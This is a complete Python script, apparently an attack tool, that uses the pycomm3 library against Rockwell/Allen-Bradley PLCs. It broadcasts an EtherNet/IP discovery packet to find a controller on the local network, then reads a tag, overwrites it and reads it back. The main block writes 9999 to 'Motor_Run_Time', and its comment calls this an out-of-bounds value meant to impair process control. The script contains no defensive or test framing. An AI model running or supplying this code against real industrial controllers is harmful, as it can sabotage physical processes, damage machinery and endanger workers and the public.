from pycomm3 import LogixDriver
import socket
import struct

def find_plc_ip():
    # Broadcast a message to discover the PLC's IP address
    broadcast_ip = '255.255.255.255'
    port = 44818  # EtherNet/IP port

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2)  # Timeout for response

    # Send a broadcast message
    message = b'\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    sock.sendto(message, (broadcast_ip, port))

    try:
        # Receive response from the PLC
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("PLC not found on the network.")
        return None
    finally:
        sock.close()

def modify_plc_parameter(plc_ip, tag_name, new_value):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            # Read the current value of the tag
            current_value = plc.read(tag_name)
            print(f"Current value of {tag_name}: {current_value.value}")

            # Modify the parameter to the new value
            plc.write(tag_name, new_value)
            print(f"Modified {tag_name} to {new_value}")

            # Verify the change
            updated_value = plc.read(tag_name)
            print(f"Updated value of {tag_name}: {updated_value.value}")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Define the tag name and the new value to set
    tag_name = "Motor_Run_Time"  # Replace with the actual tag name in your PLC program
    new_value = 9999  # Out-of-bounds value to impair process control

    # Find the PLC's IP address
    plc_ip = find_plc_ip()

    if plc_ip:
        # Modify the PLC parameter
        modify_plc_parameter(plc_ip, tag_name, new_value)
    else:
        print("Cannot proceed without the PLC's IP address.")